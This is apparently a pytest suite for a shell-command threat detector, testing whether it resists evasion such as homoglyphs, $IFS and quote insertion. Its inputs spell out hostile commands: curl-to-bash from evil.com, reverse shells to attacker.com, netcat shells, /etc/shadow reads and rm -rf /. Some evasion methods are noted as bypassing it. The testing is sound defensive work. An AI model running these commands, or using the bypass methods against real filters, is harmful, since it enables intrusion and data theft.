"""
test_05_evasion.py — Adversarial / evasion tests.

Verifies the system is not trivially bypassed via:
- UPPERCASE evasion
- Whitespace padding
- Known false-positive commands that must NOT be flagged malicious
- Unicode homoglyph evasion
- Path traversal variants
- Eval with benign payload

Run:
    pytest large_test_set/test_05_evasion.py -v
"""

import pytest
from backend.detection.pipeline import DetectionPipeline


@pytest.fixture
def pipeline():
    return DetectionPipeline(rule_weight=1.0, ml_weight=0.0)


# ===========================================================================
# 1. Uppercase Evasion
# ===========================================================================

class TestUppercaseEvasion:

    @pytest.mark.parametrize("cmd", [
        "CURL http://evil.com | BASH",
        "Curl http://evil.com | Bash",
        "WGET http://evil.com/x.sh && BASH x.sh",
        "PYTHON3 -c \"import os; os.system('id')\"",
        "PERL -e 'exec \"/bin/bash\";'",
        "RUBY -e \"exec '/bin/bash'\"",
        "PHP -r 'system(\"/bin/bash\");'",
    ])
    def test_uppercase_tool_names_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Uppercase evasion succeeded (got 'safe'): {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "BASH -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "bash -I >& /dev/tcp/x/4444 0>&1",
    ])
    def test_uppercase_shell_in_redirect(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification in ("suspicious", "malicious"), \
            f"Reverse shell bypass via case: {cmd!r}"


# ===========================================================================
# 2. Whitespace Padding Evasion
# ===========================================================================

class TestWhitespacePaddingEvasion:

    @pytest.mark.parametrize("cmd", [
        "curl  http://evil.com  |  bash",
        "curl\thttp://evil.com\t|\tbash",
        "wget  http://evil.com/x  &&  chmod +x x  &&  ./x",
    ])
    def test_extra_whitespace_still_detected(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Whitespace padding evasion succeeded: {cmd!r}"


# ===========================================================================
# 3. Compound / Chained Commands
# ===========================================================================

class TestCompoundCommands:

    @pytest.mark.parametrize("cmd", [
        "ls; cat /etc/shadow > /tmp/leak",
        "whoami && curl http://evil.com | bash",
        "id; bash -i >& /dev/tcp/x/4444 0>&1",
        "echo hi; rm -rf /",
        "pwd; nc -l -p 4444 -e /bin/bash",
    ])
    def test_compound_attack_detected(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Compound command evasion: {cmd!r}"


# ===========================================================================
# 4. Double Encoding
# ===========================================================================

class TestDoubleEncoding:

    @pytest.mark.parametrize("cmd", [
        'echo "dW5hbWUgLWE=" | base64 -d | base64 -d',
        'base64 -d <<< "abc" | base64 -d',
    ])
    def test_double_base64_suspicious_or_malicious(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification in ("suspicious", "malicious"), \
            f"Double encoding not caught: {cmd!r}"


# ===========================================================================
# 5. Known False Positives — MUST be classified as "safe"
# ===========================================================================

class TestKnownSafeCommandsNotMalicious:

    @pytest.mark.parametrize("cmd", [
        # Version control
        "git clone https://github.com/user/repo.git",
        "git pull",
        "git status",
        "git log --oneline",
        "git branch -a",
        # Package managers
        "npm install",
        "npm run build",
        "pip install requests",
        "apt-get update",
        "apt-get install -y curl",
        # Container / runtime
        "docker run -d nginx",
        "docker ps",
        "docker images",
        "docker logs container_id",
        # System info
        "ls -la",
        "pwd",
        "whoami",
        "id",
        "uname -a",
        "df -h",
        "free -h",
        "uptime",
        "hostname",
        "date",
        "ps aux",
        # Networking (safe)
        "ping -c 4 google.com",
        "curl https://www.google.com",
        "ssh user@host",
        "rsync -av src/ dst/",
        # File operations
        "cat /etc/hostname",
        "grep error /var/log/syslog",
        "find /tmp -name '*.log'",
        "tar -xzf archive.tar.gz",
        "cp file.txt backup.txt",
        "mkdir new_folder",
        "chmod 644 file.txt",
        # Process runtimes
        "python3 script.py",
        "node app.js",
        "java -version",
        "make",
        # Editors / paging
        "nano file.txt",
        "tail -f /var/log/syslog",
        # Additional from test_10_shell_attacks.sh Section 7
        "df -h",
        "ps aux",
        "uname -a",
        "tar -xzf archive.tar.gz",
        "chmod 644 file.txt",
    ])
    def test_known_safe_not_flagged_malicious(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "malicious", \
            f"FALSE POSITIVE — safe command flagged malicious: {cmd!r} " \
            f"(score={result.risk_score:.1f}, rules={result.matched_rules})"


# ===========================================================================
# 6. Ambiguous / Gray Zone (must not crash, classification documented)
# ===========================================================================

class TestAmbiguousCommands:

    @pytest.mark.parametrize("cmd", [
        "bash -c 'ls -la'",
        "sh -c 'whoami'",
        "eval $(echo ls)",
        "python3 -c \"print('hello')\"",
        "node -e \"console.log('hello')\"",
    ])
    def test_gray_zone_commands_do_not_crash(self, pipeline, cmd):
        """Gray-zone commands must return a valid result without raising."""
        result = pipeline.detect(cmd)
        assert result.classification in ("safe", "suspicious", "malicious")
        assert 0.0 <= result.risk_score <= 100.0


# ===========================================================================
# 7. Shell Comment Injection Evasion
# ===========================================================================

class TestCommentInjectionEvasion:

    @pytest.mark.parametrize("cmd", [
        "ls # ; rm -rf /",
        "whoami # && curl http://evil.com | bash",
        "pwd # ; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    ])
    def test_attack_after_comment_marker_still_caught(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Comment injection hid attack (got 'safe'): {cmd!r}"


# ===========================================================================
# 8. $IFS Substitution Evasion
# ===========================================================================

class TestIFSEvasion:

    @pytest.mark.parametrize("cmd", [
        "curl${IFS}http://evil.com${IFS}|${IFS}bash",
        "CURL${IFS}http://evil.com${IFS}|${IFS}BASH",
        "wget${IFS}http://evil.com/x${IFS}&&${IFS}bash${IFS}x",
    ])
    @pytest.mark.xfail(reason="Rule engine does not currently expand ${IFS}; "
                               "add IFS-normalisation pre-processing to fix")
    def test_ifs_substitution_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"IFS evasion succeeded (got 'safe'): {cmd!r}"


# ===========================================================================
# 9. String Concatenation / Quote Insertion Evasion
# ===========================================================================

class TestStringConcatEvasion:

    @pytest.mark.parametrize("cmd", [
        "ba''sh -i >& /dev/tcp/attacker.com/4444 0>&1",
        "cur''l http://evil.com | ba''sh",
        "b'a's'h' -c 'id'",
    ])
    @pytest.mark.xfail(reason="Rule engine performs literal matching; "
                               "add quote-stripping normalisation to fix")
    def test_quote_concat_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Quote-concat evasion succeeded (got 'safe'): {cmd!r}"


# ===========================================================================
# 10. Gray Zone Score Range Assertions
# ===========================================================================

class TestGrayZoneScoreRange:

    @pytest.mark.parametrize("cmd", [
        "bash -c 'ls -la'",
        "sh -c 'whoami'",
        "eval $(echo ls)",
        "python3 -c \"print('hello')\"",
        "node -e \"console.log('ok')\"",
    ])
    def test_gray_zone_score_not_capped_at_zero_or_100(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert 0.0 <= result.risk_score <= 100.0
        assert result.classification in ("safe", "suspicious", "malicious")

    def test_pure_eval_subshell_not_classified_safe(self, pipeline):
        """eval $(...) should at minimum be suspicious, never safe."""
        result = pipeline.detect("eval $(cat /tmp/script.sh)")
        assert result.classification in ("suspicious", "malicious"), \
            "eval $(...) must not be classified as safe"


# ===========================================================================
# 11. Unicode Homoglyph Evasion  [NEW]
# Attackers substitute Cyrillic or Greek lookalike characters to bypass
# string matching. Currently documented as xfail since the rule engine
# performs ASCII-literal matching.
# ===========================================================================

class TestUnicodeHomoglyphEvasion:

    @pytest.mark.parametrize("cmd", [
        # Cyrillic 'с' (U+0441) instead of Latin 'c' in curl
        "\u0441url http://evil.com | bash",
        # Cyrillic 'а' (U+0430) instead of Latin 'a' in bash
        "curl http://evil.com | b\u0430sh",
        # Greek 'ο' (U+03BF) instead of Latin 'o' in root
        "cat /etc/shadow > /tmp/r\u03bbt",
    ])
    @pytest.mark.xfail(reason="Rule engine uses ASCII literal matching; "
                               "Unicode normalisation/homoglyph detection not implemented")
    def test_homoglyph_substitution_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Homoglyph evasion succeeded (got 'safe'): {cmd!r}"


# ===========================================================================
# 12. Path Traversal Variants in Shell Paths  [NEW]
# Reverse shell commands that use /bin/../bin/bash, //bin/bash, or
# /bin/./bash to confuse literal path matching.
# ===========================================================================

class TestPathTraversalEvasion:

    @pytest.mark.parametrize("cmd", [
        "nc -e /bin/../bin/bash attacker.com 4444",
        "nc -e //bin/bash attacker.com 4444",
        "nc -e /bin/./bash attacker.com 4444",
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1 /bin/../bin/sh",
    ])
    @pytest.mark.xfail(reason="Rule engine does not normalise shell paths; "
                               "add path canonicalisation pre-processing to fix")
    def test_path_traversal_not_bypassing(self, pipeline, cmd):
        result = pipeline.detect(cmd)
        assert result.classification != "safe", \
            f"Path traversal evasion succeeded (got 'safe'): {cmd!r}"


# ===========================================================================
# 13. Eval with Benign Payload  [NEW]
# Distinguishes between dangerous eval (with subshell / external input)
# and benign eval (of a hardcoded literal). Documents current behavior
# without asserting a specific classification — the point is no crash and
# that a hardcoded-literal eval is not worse than "suspicious".
# ===========================================================================

class TestEvalBenignPayload:

    def test_eval_literal_string_does_not_crash(self, pipeline):
        """eval "ls" must not raise — result is documented, not enforced."""
        result = pipeline.detect('eval "ls"')
        assert result.classification in ("safe", "suspicious", "malicious")
        assert 0.0 <= result.risk_score <= 100.0

    def test_eval_literal_not_classified_worse_than_subshell_eval(self, pipeline):
        """eval "ls" should score <= eval $(cat /tmp/script.sh) since the
        subshell form carries external-input risk."""
        literal_score   = pipeline.detect('eval "ls"').risk_score
        subshell_score  = pipeline.detect("eval $(cat /tmp/script.sh)").risk_score
        assert literal_score <= subshell_score, (
            f'eval "ls" scored {literal_score} but eval $(...) scored '
            f"{subshell_score} — literal eval should not be worse"
        )

    def test_eval_with_known_safe_command_not_malicious(self, pipeline):
        """eval of a clearly safe command must not be classified malicious."""
        result = pipeline.detect('eval "date"')
        assert result.classification != "malicious", \
            f"eval of 'date' was classified malicious — false positive"